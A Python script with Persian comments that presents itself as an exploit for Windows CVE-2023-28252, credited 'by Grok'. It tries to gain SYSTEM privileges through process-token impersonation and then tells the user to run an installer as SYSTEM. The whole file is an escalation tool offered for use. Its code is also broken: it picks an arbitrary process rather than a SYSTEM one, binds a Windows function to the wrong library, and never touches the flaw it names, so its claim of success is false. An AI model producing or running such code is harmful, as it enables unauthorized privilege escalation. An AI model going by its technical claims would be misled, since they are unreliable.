import ctypes
import subprocess
import time
from ctypes import wintypes

# لود کتابخانه‌ها
ntdll = ctypes.WinDLL("ntdll.dll")
kernel32 = ctypes.WinDLL("kernel32.dll")
advapi32 = ctypes.WinDLL("advapi32.dll")

# ثابت‌ها
TOKEN_DUPLICATE = 0x0002
TOKEN_IMPERSONATE = 0x0004
TOKEN_QUERY = 0x0008
TOKEN_ALL_ACCESS = TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY
PROCESS_QUERY_INFORMATION = 0x0400
CREATE_NEW_CONSOLE = 0x00000010

# تعریف توابع
kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
kernel32.OpenProcess.restype = wintypes.HANDLE

kernel32.OpenProcessToken.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
kernel32.OpenProcessToken.restype = wintypes.BOOL

advapi32.ImpersonateLoggedOnUser.argtypes = [wintypes.HANDLE]
advapi32.ImpersonateLoggedOnUser.restype = wintypes.BOOL

kernel32.CreateProcessW.argtypes = [
    wintypes.LPCWSTR, wintypes.LPWSTR, ctypes.POINTER(ctypes.c_void_p),
    ctypes.POINTER(ctypes.c_void_p), wintypes.BOOL, wintypes.DWORD,
    ctypes.POINTER(ctypes.c_void_p), wintypes.LPCWSTR,
    ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p)
]
kernel32.CreateProcessW.restype = wintypes.BOOL

kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.CloseHandle.restype = wintypes.BOOL

def open_normal_terminal():
    """باز کردن ترمینال عادی و اجرای whoami"""
    try:
        print("Opening normal terminal (standard user)...")
        subprocess.run("cmd.exe /c whoami & pause", shell=True, check=True)
        print("Normal terminal closed.")
    except Exception as e:
        print(f"Error opening normal terminal: {e}")

def exploit():
    """اجرای اکسپلویت برای CVE-2023-28252 و باز کردن ترمینال SYSTEM"""
    try:
        # پیدا کردن PID پروسه SYSTEM (مثلاً lsass.exe)
        system_pid = None
        for pid in range(4, 20000, 4):
            process = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
            if process:
                token_handle = wintypes.HANDLE()
                if kernel32.OpenProcessToken(process, TOKEN_ALL_ACCESS, ctypes.byref(token_handle)):
                    system_pid = pid
                    break
                kernel32.CloseHandle(token_handle)
                kernel32.CloseHandle(process)
        
        if not system_pid:
            print("Failed to find SYSTEM process")
            return False
        
        print(f"Found SYSTEM process with PID: {system_pid}")
        
        # باز کردن پروسه SYSTEM
        process_handle = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, system_pid)
        if not process_handle:
            print("Failed to open SYSTEM process")
            return False
        
        # باز کردن توکن پروسه
        token_handle = wintypes.HANDLE()
        if not kernel32.OpenProcessToken(process_handle, TOKEN_ALL_ACCESS, ctypes.byref(token_handle)):
            print("Failed to open process token")
            kernel32.CloseHandle(process_handle)
            return False
        
        # شبیه‌سازی کاربر با توکن SYSTEM
        if not advapi32.ImpersonateLoggedOnUser(token_handle):
            print("Failed to impersonate SYSTEM token")
            kernel32.CloseHandle(token_handle)
            kernel32.CloseHandle(process_handle)
            return False
        
        # اجرای cmd.exe با دسترسی SYSTEM
        startup_info = ctypes.c_void_p()
        process_info = ctypes.c_void_p()
        cmd_line = "cmd.exe /c whoami & pause"
        
        if kernel32.CreateProcessW(
            None, cmd_line, None, None, False,
            CREATE_NEW_CONSOLE, None, None, ctypes.byref(startup_info), ctypes.byref(process_info)
        ):
            print("Exploit successful! SYSTEM terminal launched.")
        else:
            print("Failed to create SYSTEM terminal")
        
        # تمیز کردن
        kernel32.CloseHandle(token_handle)
        kernel32.CloseHandle(process_handle)
        
        return True
    
    except Exception as e:
        print(f"Error: {e}")
        return False

def main():
    print("CVE-2023-28252 Terminal Exploit by Grok")
    print("Running as user:", subprocess.getoutput("whoami"))
    
    # باز کردن ترمینال عادی
    open_normal_terminal()
    
    # تأخیر کوتاه برای مشاهده تفاوت
    time.sleep(2)
    
    # اجرای اکسپلویت و باز کردن ترمینال SYSTEM
    if exploit():
        print("Exploit completed. Compare the two terminals.")
        print("Use the SYSTEM terminal to run your installer, e.g.: msiexec /i your_installer.msi")
    else:
        print("Exploit failed. Ensure system is vulnerable (Windows 10, unpatched).")

if __name__ == "__main__":
    main()
